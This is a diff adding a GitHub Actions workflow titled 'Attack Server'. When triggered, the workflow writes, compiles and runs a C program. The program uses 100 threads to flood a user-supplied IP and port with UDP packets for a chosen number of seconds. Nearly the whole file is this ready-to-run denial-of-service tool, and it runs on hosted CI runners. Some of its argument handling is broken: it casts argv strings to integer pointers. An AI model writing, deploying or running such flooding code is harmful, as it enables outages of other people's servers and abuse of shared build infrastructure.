@@ -1,0 +1,81 @@
+name: Attack Server
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+        type: string
+      port:
+        description: 'Target Port'
+        required: true
+        type: string
+      duration:
+        description: 'Duration (seconds)'
+        required: true
+        default: '30'
+        type: string
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Install GCC
+      run: sudo apt update && sudo apt install gcc -y
+    
+    - name: Compile & Run
+      run: |
+        cat > unreal.c << 'EOF'
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <string.h>
+        #include <unistd.h>
+        #include <arpa/inet.h>
+        #include <pthread.h>
+        #include <time.h>
+        
+        void *send_packets(void *arg) {
+            char *ip = ((char**)arg)[0];
+            int port = *(int*)((char**)arg)[1];
+            int duration = *(int*)((char**)arg)[2];
+            
+            int sock;
+            struct sockaddr_in addr;
+            time_t endtime;
+            
+            char payload[] = "\x90\x90\x90\x90\xEB\xFE";
+            
+            sock = socket(AF_INET, SOCK_DGRAM, 0);
+            addr.sin_family = AF_INET;
+            addr.sin_port = htons(port);
+            addr.sin_addr.s_addr = inet_addr(ip);
+            
+            endtime = time(NULL) + duration;
+            
+            while (time(NULL) <= endtime) {
+                sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
+            }
+            
+            close(sock);
+            return NULL;
+        }
+        
+        int main(int argc, char *argv[]) {
+            pthread_t threads[100];
+            int port = atoi(argv[2]);
+            int duration = atoi(argv[3]);
+            
+            for (int i = 0; i < 100; i++) {
+                pthread_create(&threads[i], NULL, send_packets, (void*)argv);
+            }
+            for (int i = 0; i < 100; i++) {
+                pthread_join(threads[i], NULL);
+            }
+            return 0;
+        }
+        EOF
+        
+        gcc -o unreal unreal.c -lpthread
+        ./unreal ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.duration }}
